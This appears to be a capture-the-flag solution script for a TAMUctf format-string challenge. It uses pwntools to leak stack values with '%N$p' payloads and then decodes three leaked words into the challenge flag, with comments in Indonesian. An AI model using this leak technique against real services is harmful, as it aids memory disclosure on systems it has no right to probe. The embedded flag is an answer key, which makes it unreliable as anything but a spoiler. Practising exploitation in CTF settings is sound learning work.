"""
from pwn import *
p =process("./echoasaservice")
#p = remote("challenges.tamuctf.com", 4251)
def offsetFinder():
	for i in range(20):	
		p.sendline("{}:  %{}$p".format(i,i))
	p.interactive()
	
if __name__ =="__main__":
	offsetFinder()
"""


import pwn
a = "61337b6d65676967"  #variable ke 8
b ="616d7230665f7973" #variable ke 9
z= "7d316e6c75765f74" #varible ke 10
c = z+b+a 
print(c.decode("hex")[::-1])
#disusun dan didecode terbalik karena efek little endian 

